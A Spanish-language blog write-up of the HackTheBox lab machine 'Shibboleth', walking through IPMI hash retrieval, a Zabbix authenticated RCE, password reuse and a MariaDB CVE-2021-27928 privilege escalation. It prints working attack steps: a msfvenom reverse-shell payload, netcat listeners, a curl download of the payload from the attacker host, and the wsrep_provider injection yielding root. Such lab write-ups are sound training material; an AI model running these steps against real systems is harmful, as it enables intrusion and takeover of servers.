---
layout      : post
title       : "HackTheBox - Shibboleth"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410banner.png
category    : [ htb ]
tags        : [ IPMI, command-injection, mariadb-vuln, Zabbix ]
---
Máquina Linux nivel medio. Jugaremos con protocolos para controlar la existencia (`IPMI`), reutilización de credenciales, inyección de comandos (en `Zabbix`) y más inyección de comandos (en `mysql`).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410shibbolethHTB.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [knightmare](https://www.hackthebox.eu/profile/8930) & [mrb3n](https://www.hackthebox.eu/profile/2984).

¡Hay que filtrar bien esos campoooooooos!

Tendremos un servicio web con bastantes rabbit-holes, encontraremos subdominios relacionando el software `Zabbix`.

Nos toparemos con el servicio `ASF Remote Management Control Protocol` e `IPMI`, investigando sobre ellos y algunas vulnerabilidades, extraeremos usuarios activos en el servicio y contraseñas hasheadas, aprovecharemos una vuln para **manualmente** pasar esos "hashes" a "texto plano", o sea obtener credenciales. Esas credenciales nos serán útiles para acceder al panel administrativo de `Zabbix`.

Estando dentro de **Zabbix** también tendremos una vulnerabilidad, esta vez explotando un `command-injection`, lo aprovecharemos para generar una reverse shell en el sistema como `zabbix`.

Jugando con reutilización de contraseñas nos moveremos al usuario `ipmi-svc`, con él enumeraremos el sistema para encontrar credenciales de `mysql`, juntaremos eso y la versión de **MySQL** que es vulnerable a otro **command-injection** para obtener una nueva reverse shell como el usuario `root`.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410rating.png" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410statistics.png" style="width: 80%;"/>

Muuuuuuchas vulns públicas y conocidas (= máquina llevada a la realidad) (me gusta).

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) :) La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo las ganas para ayudarnos ¿por que no hacerlo? ... Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3 Todo lo que ves es vida!

...

Quiero quedarme en ti.

1. [Reconocimiento](#reconocimiento).
  * [Descubrimos puertos usando **nmap**](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Jugamos con el **puerto 80**](#puerto-80).
  * [Encontramos servicio **UDP**](#udp-ipmi).
3. [Explotación](#explotacion).
  * [Jugamos con **zabbix**](#zabbix-rce).
4. [Somos otro usuario muuuy rapido :P](#user-ipmi-svc).
5. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Descubrimiento de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Como siempre necesitamos saber que activos tiene la máquina, para descubrirlos usaremos `nmap`:

```bash
❱ nmap -p- --open -v 10.10.11.124 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Tenemos:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Thu Mar 24 25:25:25 2022 as: nmap -p- --open -v -oG initScan 10.10.11.124
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.124 () Status: Up
Host: 10.10.11.124 () Ports: 80/open/tcp//http///
# Nmap done at Thu Mar 24 25:25:25 2022 -- 1 IP address (1 host up) scanned in 312.00 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Un servidor web. |

No tenemos más, ahora veamos algo más de info con respecto a ese puerto, como por ejemplo la versión de software y también tantear con algunos scripts nativos de `nmap` a ver que descubren:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, en este caso se ve bastante sin sentido usarlo, pero en caso de tener muuuuchos puertos es muy óptimo:**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.124
    [*] Open ports: 80

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 80 -sC -sV 10.10.11.124 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos             |
| -sC       | Prueba con **scripts** de nmap algunas vulns |
| -sV       | Nos permite ver la versión del servicio      |
| -oN       | Guarda el output en un archivo               |

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Thu Mar 24 25:25:25 2022 as: nmap -p 80 -sC -sV -oN portScan 10.10.11.124
Nmap scan report for 10.10.11.124
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 24 25:25:25 2022 -- 1 IP address (1 host up) scanned in 13.13 seconds
```

¿Qué descubrimos?

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Apache 2.4.41 |

* Además de mostrarnos un redirect hacia el dominio `shibboleth.htb`, ahorita jugaremos con esto.

No tenemos mucho que rescatar, así que sigamos y rompamos esta vuelta.

# Enumeración [#](#enumeracion) {#enumeracion}

---

## Jugamos con el <u>puerto 80</u> [📌](#puerto-80) {#puerto-80}

Recordemos que tenemos un redirect, por lo que al intentar una petición contra la ip `10.10.11.124` el sistema no entiende realmente hacia donde apuntar, ya que el dominio `shibboleth.htb` no esta indicado en ningún lado. Para hacérselo saber usaremos el archivo [/etc/hosts](https://www.siteground.es/kb/archivo-hosts/), ahí colocamos el host y los dominios asociados, por lo que si hacemos la petición de nuevo, ya sea contra la IP o el dominio, el sistema entiende y devuelve la respuesta del servidor:

```bash
❱ cat /etc/hosts
...
10.10.11.124  shibboleth.htb
...
```

Yyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410page80.png" style="width: 100%;"/>

Ya tenemos acceso al sitio...

Pero dando vueltas y buscando cositas no encontramos nada, así que podemos descubrir tanto posibles **subdominios** o **directorios** alojados en el sitio web, hagamos las dos, primero directorios:

```bash
❱ wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.124 -H 'Host: FUZZ.shibboleth.htb'
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000001:   302        9 L      26 W       290 Ch      "www"
000000003:   302        9 L      26 W       290 Ch      "ftp"
000000007:   302        9 L      26 W       294 Ch      "webdisk"
000000015:   302        9 L      26 W       289 Ch      "ns"
000000021:   302        9 L      26 W       290 Ch      "ns3"
000000020:   302        9 L      26 W       291 Ch      "www2"
```

Evitamos que nos muestre esos falsos positivos, por ejemplo, quitando respuestas con **26 W (words)** palabras:

```bash
❱ wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.124 -H 'Host: FUZZ.shibboleth.htb' --hc=404 --hw=26
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000099:   200        29 L     219 W      3684 Ch     "monitor"
000000346:   200        29 L     219 W      3684 Ch     "monitoring"
000000390:   200        29 L     219 W      3684 Ch     "zabbix"
...
```

Uhh tenemos 3 subdominios (: Pues hacemos lo mismo de antes, los agregamos al objeto `/etc/hosts` y vemos su resultado en la web.

Todos responden con un login-panel del software [zabbix](https://es.wikipedia.org/wiki/Zabbix):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410page80_zabbix_loginPanel.png" style="width: 100%;"/>

¿Pero qué es **zabbix**? Rápidamente:

> "**Zabbix** está diseñado para monitorizar y registrar el estado de varios servicios de red, servidores y hardware de red." ~ [**Wikipedia**](https://es.wikipedia.org/wiki/Zabbix)

Perfecto, lo primero fue probar credenciales por default en varios sistemas (como `admin`:`admin`), pero no logramos pasar el login-panel, también jugamos con algunos payloads, ya sea para generar errores llamativos o incluso bypassear el login, solo que tampoco fue fructifero :'( Después revisando el código fuente de la web encontramos la versión de `zabbix` que esta siendo usada:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410page80_zabbix_loginPanel_sourceCode_version.png" style="width: 100%;"/>

Esto nos permite direccionar nuestra siguiente búsqueda en la web: `zabbix 5.0 exploit`, obtenemos algunos recursos llamativos:

* [Zabbix 5.x SQL Injection / Cross Site Scripting](https://packetstormsecurity.com/files/163657/Zabbix-5.x-SQL-Injection-Cross-Site-Scripting.html).
* [Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50816).
* [CVE-2021-27927: CSRF to RCE Chain in Zabbix](https://www.horizon3.ai/cve-2021-27927-csrf-to-rce-chain-in-zabbix/).

Pero después de probarlos no logré hacerlos funcionar ):

> Acá estuve LA de tiempo sin ideas claras, así que dejé la máquina un rato para retomarla con frescura, me sirvio.

---

## Encontramos servicio <u>UDP</u>[📌](#udp-ipmi) {#udp-ipmi}

Algo que ya me había pasado era estancarme en una máquina sin haber hecho un reconocimiento completo, en este caso fue igual, nos faltó un pequeño detalle a probar: ver si hay activos puertos **UDP** (los que enumeramos antes fueron los **TCP**), hagámosle:

```bash
❱ nmap -sU -p- --open -v --min-rate=2000 10.10.11.124 -oG udpScan
```

| Argumento | Descripción |
| :-------- | :---------- |
| -sU        | Le indicamos que únicamente queremos descubrir puertos **UDP**. |
| --min-rate | (Para casos en los que el escaneo va lento) Envía X cantidad de paquetes por cada petición. |

Y nos devuelve:

```bash
❱ cat udpScan 
# Nmap 7.80 scan initiated Wed Mar 30 25:25:25 2022 as: nmap -sU -p- --open -v --min-rate=2000 -oG udpScan 10.10.11.124
# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.124 (shibboleth.htb) Status: Up
Host: 10.10.11.124 (shibboleth.htb) Ports: 623/open/udp//asf-rmcp///
# Nmap done at Wed Mar 30 25:25:25 2022 -- 1 IP address (1 host up) scanned in 375.81 seconds
```

Ahora tomamos ese puerto y vemos que tiene por detrás:

```bash
❱ nmap -sU -p 623 -sC -sV 10.10.11.124 -oN udpPortScan
```

```bash
# Nmap 7.80 scan initiated Wed Mar 30 25:25:25 2022 as: nmap -sU -p 623 -sC -sV -oN udpPortScan 10.10.11.124
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.18s latency).

PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.80%I=7%D=3/30%Time=62449EA2%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 30 25:25:25 2022 -- 1 IP address (1 host up) scanned in 6.28 seconds
```

Finalmente tenemos:

| Puerto | Servicio |
| :----- | :------- |
| 623    | asf-rmcp |

Y en internet encontramos:

> "ASF Remote Management and Control Protocol (ASF-RMCP)." ~ [**cusiglas.com**](https://www.cusiglas.com/siglade/623-asf-remote-management-and-control-protocol-asf-rmcp.php)

> "Baseboard Management Controllers (BMCs) are a type of embedded computer used to provide out-of-band monitoring for desktops and servers." ~ [**hacktricks.xyz**](https://book.hacktricks.xyz/pentesting/623-udp-ipmi)

---

# Explotación [#](#explotacion) {#explotacion}

Tenemos un servicio para monitorear y controlar servidores y escritorios (: Además encontramos dos post para directamente probar vulnerabilidades relacionadas con ese puerto:

* [623/UDP/TCP - IPMI](https://book.hacktricks.xyz/pentesting/623-udp-ipmi).
* [A Penetration Tester's Guide to IPMI and BMCs](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/).

Algunas pruebas son llevadas a cabo mediante la herramienta `ipmitool`, la instalamos así:

```bash
❱ apt-get install ipmitool
```

Entre las vulns podemos saltarnos la autenticación para ver una lista de usuarios especificando el indicador `Cipher 0` (para usar credenciales en texto plano), peeeeero necesitamos tener un usuario **válido** en el servicio:

```bash
❱ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U root -P root user list
Error: Unable to establish IPMI v2 / RMCP+ session
```

Quiere decir que el usuario `root` no nos permite generar una sesión (por lo tanto, no es válido), después de probar algunos obtenemos esta respuesta con `Administrator`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_ipmi_bypassAuth_Administrator_userList.png" style="width: 100%;"/>

OPAAA LA POPAAA! Pues efectivamente se logra el **bypass** y vemos todos los usuarios, aunque solo notamos a `Administrator` entre todos los **63** (solo liste 15 :P) campos disponibles.

Ya conocemos el usuario, pero no podemos hacer realmente mucho con esto, existe otra vuln muuuuuuy jugosa, la explicación del post es muy chévere:

> "Basically, you can ask the server for the hashes MD5 and SHA1 of any username and if the username exists those hashes will be sent back. Yeah, as amazing as it sounds." ~ [**hacktricks.xyz**](https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-2.0-rakp-authentication-remote-password-hash-retrieval)

* [https://www.cvedetails.com/cve/CVE-2013-4786/](https://www.cvedetails.com/cve/CVE-2013-4786/)

😝 Pos si, sencillamente el servidor puede responder los hashes de cualquier usuario, :P esto nos sirve para posteriormente intentar crackearlos y en el caso positivo tener una contraseña en texto plano...

Buscando, hay un post que nos explica la vulnerabilidad y como hacerlo manualmente:

* [Leaky hashes in the RAKP Protocol](http://fish2.com/ipmi/remote-pw-cracking.html).
* [El propio post tiene un script en **Perl**](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/shibboleth/rak-the-ripper.pl).

Es muy sencillo, juega con `ipmitool` para extraer una identidad, del output (con errores, ya que no conocemos las credenciales del usuario **Administrator**) extrae unos bytes que conforman una contraseña hasheada (pos si), con ese hash y una contraseña (brute-force) generar una [HMAC](https://es.wikipedia.org/wiki/HMAC), finalmente se compara la **hmac** con otra parte del output obtenido y si son iguales tendríamos la contraseña.

🚨 **Con algún que otro dolor de cabeza logramos sacar este lindo script que toma un wordlist, por cada palabra genera una HMAC y cada HMAC es comparada con una parte del output (el BMC), si son iguales tenemos contraseñaaaaaaaaaaaaaaaa** 🚨:

> ⚠️ [bruteforce_hmac_ipmi.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/shibboleth/bruteforce_hmac_ipmi.py)

Le pasamos el wordlist `rockyou.txt` (`/usr/share/wordlists/rockyou.txt`) yyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_PY_bruteforceIPMI_foundPW.png" style="width: 100%;"/>

VAMOOOOOOOOOOOOOO! Encontramos una coincidencia, por lo tanto, tenemos una contraseñaaaaaa y un usuario, recordemos que tenemos un login-panel, pues intentemos hacer reutilización de contraseñas, quizás sea válida ahí...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410page80_zabbix_loginWITHcreds.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410page80_zabbix_dashboard.png" style="width: 100%;"/>

Y SÍ! Conseguimos acceso al sitio y sus funcionalidades (:

## Explotamos <u>zabbix</u>[📌](#zabbix-rce) {#zabbix-rce}

Abriendo bien los ojos en la parte de abajo notamos la versión actual ya clarísima de `zabbix`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410page80_dashboard_zabbixVersionFULL.png" style="width: 100%;"/>

Esto nos permite direccionar nuevas búsquedas como: `xabbix 5.0.17 exploit` y encontrar cositas -como-:

* [Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50816).

El exploit aprovecha una opción para ejecutar comandos, en su lógica nos indica que la explotación en **blind** (no obtenemos output), así que ejecuta una Reverse Shell únicamente, descarguémoslo y corrámoslo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_PY_rceZabbix.png" style="width: 100%;"/>

Antes de ejecutarlo debemos levantar nuestro listener (en donde llegará la RevShell):

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
```

Y ahora si ejecutamos, enviara una petición con una `/bin/sh` al puerto **4433** de la dirección IP **10.10.14.142**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_PY_rceZabbix_id.png" style="width: 100%;"/>

Y TENEMOS NUESTRA REVERSE SHEEEEEELL! Hagámosla linda rápidamente (para tener histórico, movernos entre comandos y ejecutar tranquilamente `CTRL^C`):

* [https://lanzt.gitbook.io/cheatsheet-pentest/tty](https://lanzt.gitbook.io/cheatsheet-pentest/tty)

Sigamos (:

# zabbix -> ipmi-svc [#](#user-ipmi-svc) {#user-ipmi-svc}

En el sistema hay un usuario con carpeta `/home` llamado `ipmi-svc`:

```bash
zabbix@shibboleth:/$ ls -la /home
total 12
drwxr-xr-x  3 root     root     4096 Oct 16 12:24 .
drwxr-xr-x 19 root     root     4096 Oct 16 16:41 ..
drwxr-xr-x  4 ipmi-svc ipmi-svc 4096 Apr  1 15:59 ipmi-svc
```

Si volvemos a jugar con **reutilización de contraseñas** logramos una sesión como él:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_SUipmisvc_RevSH_id.png" style="width: 100%;"/>

Ahora si veamos como volvernos **admin** en esta vuelta...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Filtrando archivos del sistema que estén asociados a nuestro usuario, por ejemplo al grupo `ipmi-svc`, tenemos la configuración que usa `zabbix`:

```bash
ipmi-svc@shibboleth:~$ find / -group ipmi-svc 2>/dev/null | grep -vE "proc|sys"
...
/etc/zabbix/zabbix_server.conf
```

```bash
ipmi-svc@shibboleth:~$ cat /etc/zabbix/zabbix_server.conf
# This is a configuration file for Zabbix server daemon
# To get more information about Zabbix, visit http://www.zabbix.com

############ GENERAL PARAMETERS #################

### Option: ListenPort
#       Listen port for trapper.
#
# Mandatory: no
# Range: 1024-32767
...
...
```

En su contenido hay varios comentarios (empiezan con `#`), si los quitamos y además borramos las líneas iguales (como las líneas sin contenido) tenemos:

```bash
ipmi-svc@shibboleth:~$ cat /etc/zabbix/zabbix_server.conf | grep -vE "^#" | sort -u
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_zabbixRevSH_findGROUPfilesIPMISVC_foundZabbixConf.png" style="width: 100%;"/>

Si nos fijamos tenemos unas credenciales de `mysql` :o Probemos a ver si son válidas (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_zabbixRevSH_mysql_withCredsZabbix_done.png" style="width: 100%;"/>

Peeerfeto! Antes de profundizar intentamos reutilización de contraseñas, pero nope, no son válidas contra `root`. Tampoco logramos nada interesante en las tablas que tiene la base de datos `zabbix`.

Algo que debemos probar siempre es ver las versiones tanto del kernel, de servicios en puertos llamativos, de programas interesantes y de todo lo que podamos pensar que puede estar siendo ejecutado por otro usuario y tenga oportunidad de ser explotado si esta desactualizado.

Si enumeramos la versión de `mysql` (pues ya que estamos jugando con él) vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_zabbixRevSH_mysql_version.png" style="width: 100%;"/>

Esta usando la versión `10.3.25` de [MariaDB](https://es.wikipedia.org/wiki/MariaDB) yyyyyyyyy como dije antes, esto nos sirve para buscar exploits en internet, llegamos a este repo que nos pone muuyyy atentos:

* [https://github.com/Al1ex/CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410google_github_CVE_2021_27928_appearsVulnerable.png" style="width: 100%;"/>

Contamos con una de las versiones vulnerables! Y es un **command-injection**! Uhh uhh uuuuuuh...

> "An untrusted search path leads to eval injection, in which a database SUPER user can execute OS commands after modifying `wsrep_provider` and `wsrep_notify_cmd`." ~ [**nvd.nist.gov/CVE-2021-27928**](https://nvd.nist.gov/vuln/detail/CVE-2021-27928)

Upa, únicamente jugando con las variables [wsrep_provider](https://galeracluster.com/library/documentation/mysql-wsrep-options.html#wsrep-provider) o [wsrep_notify_cmd](https://galeracluster.com/library/documentation/mysql-wsrep-options.html#wsrep-notify-cmd) se genera el **command-injection**, ya que las dos almacenan "nodos" que posteriormente serán ejecutados por el servicio `mysql`, ¿y si esos "nodos" están -maliciosos-? 😇

La explotación es bastante sencilla de probar, son 4 pasos:

1. Crear payload que contenga la reverse shell (nos apoyamos de `msfvenom`).
2. Nos ponemos en escucha para obtener posteriormente la reverse shell.
3. Transferimos el payload a la máquina.
4. Modificamos una de las variables para que contenga el objeto con nuestro payload (y se ejecutaría :P)

Demoslé:

1️⃣ **Crear payload que contenga la reverse shell (nos apoyamos de `msfvenom`).**

**msfvenom** nos ayuda muuuy rápido a crear payloads para distintos tipos de entornos, en este caso necesitamos generar un objeto que al ser ejecutado cree una **reverse shell** y su formato debe ser `elf-so`:

```bash
❱ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.142 LPORT=4434 -f elf-so -o CVE-2021-27928.so
```

Y como resultado:

```bash
❱ file CVE-2021-27928.so 
CVE-2021-27928.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped
```

2️⃣ **Nos ponemos en escucha para obtener posteriormente la reverse shell.**

Levantamos un listener en el puerto `4434` (que es el que le hemos indicado al payload):

```bash
❱ nc -lvp 4434
listening on [any] 4434 ...
```

3️⃣ **Transferimos el payload a la máquina.**

Levantamos ahora un servidor web con `Python` donde tengamos el payload:

```bash
❱ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y en la máquina víctima hacemos una petición hacia ese servidor y el payload:

```bash
ipmi-svc@shibboleth:~$ cd /tmp/  # Entorno de trabajo
ipmi-svc@shibboleth:/tmp$ mkdir test; cd test
ipmi-svc@shibboleth:/tmp/test$
ipmi-svc@shibboleth:/tmp/test$ curl http://10.10.14.142:8000/CVE-2021-27928.so -o CVE-2021-27928.so
ipmi-svc@shibboleth:/tmp/test$ file CVE-2021-27928.so 
CVE-2021-27928.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped
```

4️⃣ **Modificamos una de las variables para que contenga el objeto con nuestro payload.**

Y llega el momento de la verdad, juguemos con `mysql` para agregar el contenido en la variable:

```bash
ipmi-svc@shibboleth:/tmp/test$ mysql -u zabbix -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g
...
```

Y ahora la magia:

```bash
MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/test/CVE-2021-27928.so";
```

Obtenemos:

```bash
ERROR 2013 (HY000): Lost connection to MySQL server during query
```

PEEEEEEEEEEERO en nuestro listener:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_rootRevSH_netcat_done.png" style="width: 100%;"/>

TENEMOS PETICIÓóÓóóóN! Y si intentamos ejecutar comandos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410bash_rootRevSH_id.png" style="width: 100%;"/>

Somos **root** compita! Veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/shibboleth/410flags.png" style="width: 100%;"/>

Nospi :*

...

Un inicio bastante bestial, básicamente porque casi muero buscando como entrar :P Con vulns bien interesantes, además de abrirnos las puertas a jugar con scripteo del guapo, en general una máquina fresca, me gusta.

Por mi parte no es más, como siempre les agradezco demasiado por leerse este pastoral, espero haya sido de ayuda y nada, a seguir rompiendo de todooooooooooooO!